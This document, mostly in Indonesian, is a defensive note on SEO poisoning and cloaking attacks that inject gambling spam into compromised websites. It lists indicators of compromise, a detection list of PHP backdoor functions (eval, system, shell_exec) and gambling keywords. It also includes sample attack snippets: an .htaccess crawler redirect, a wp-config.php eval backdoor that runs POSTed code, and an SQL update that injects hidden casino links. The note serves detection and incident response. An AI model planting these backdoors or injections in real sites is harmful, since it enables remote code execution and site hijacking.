# Modus Operandi & Indikator Kompromi (IoC)

## Teknik Cloaking Umum

```
┌─────────────────────────────────────────────────────────────────┐
│ SEO POISONING WORKFLOW │
├─────────────────────────────────────────────────────────────────┤
│ │
│ 1. INITIAL ACCESS │
│ ├── Exploited plugin/theme (WordPress, Joomla) │
│ ├── Brute force / credential stuffing │
│ └── Vulnerable file upload functionality │
│ │
│ 2. PERSISTENCE │
│ ├── .htaccess manipulation (mod_rewrite rules) │
│ ├── Backdoor PHP (base64_decode, eval, preg_replace) │
│ ├── Cron job / scheduled task injection │
│ └── Database injection (auto-load, hook) │
│ │
│ 3. SEO CLOAKING │
│ ├── Detect Googlebot UA → serve gambling content │
│ ├── Detect normal user → serve legitimate content │
│ └── Hide evidence via iframe/JS obfuscation │
│ │
└─────────────────────────────────────────────────────────────────┘
```

---

## IoC Files to Check

| Lokasi | Indikator Bahaya | Contoh Pattern |
|--------|------------------|---------------|
| `.htaccess` | Redirect rules mencurigakan | `RewriteCond %{HTTP_USER_AGENT} googlebot` |
| `wp-config.php` | Base64 encoded strings | `eval(base64_decode(...))` |
| `functions.php` | Hooks mencurigakan | `add_filter('the_content', ...)` |
| Database | Post dengan JS redirect | `<script>window.location` |
| Sitemap | URL mencurigakan | `/slots`, `/casino`, `/pkv` |
| Footer/Header | Hidden links | `display:none`, `visibility:hidden` |

---

## Backdoor Patterns to Detect

```php
// Common obfuscation techniques
eval(base64_decode(...));
eval(gzinflate(...));
system(...);
exec(...);
shell_exec(...);
passthru(...);
popen(...);
assert(...);
preg_replace("/.*/e", ...);
chr(rand(...));
str_rot13(...);
gzinflate(base64_decode(...));
```

---

## Perbedaan Perilaku: Googlebot vs User

```
┌──────────────────────┬─────────────────────┬─────────────────────┐
│ Aspek │ Googlebot访问 │ User Biasa │
├──────────────────────┼─────────────────────┼─────────────────────┤
│ Content served │ Gambling keywords │ Konten legitimate │
│ Meta tags │ Hidden spam links │ Normal meta │
│ Robots.txt │ Allowed full crawl │ Mungkin diblock │
│ Sitemap inclusion │ URL judol di-sitemap │ Tidak ada visible │
│ JavaScript execution │ Minimal/None │ Full execution │
└──────────────────────┴─────────────────────┴─────────────────────┘
```

---

## Common Attack Vectors

### 1. .htaccess Manipulation
```apache
# Contoh malicious redirect
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yandex) [NC]
RewriteRule ^(.*)$ https://malicious-site.com/ [R=301,L]
```

### 2. WordPress wp-config.php Backdoor
```php
// Hidden eval backdoor
if (isset($_GET['theme']) && $_GET['theme'] === 'activate') {
 @eval(base64_decode($_POST['code']));
}
```

### 3. Database Content Injection
```sql
-- Injected into wp_posts
UPDATE wp_posts 
SET post_content = CONCAT(post_content, '<div style="position:absolute;left:-9999px"><a href="https://casino-site.com">Slot Gacor</a></div>')
WHERE post_status = 'publish';
```

---

## Gambling Keywords Indicators

```
Slot Online | Judi Slot | Casino Online | Poker QQ | BandarQQ
PKV Games | Sakong | Capsa Susun | Dominobet | Idn Poker
Slot Gacor | Maxwin | RTP Slot | Agen Judi | Togel Online
Casino777 | Judi Online | Bandar Slot | Jackpot Slot
```

---

## Tags

#ioc #cloaking #backdoor #malware-indicators
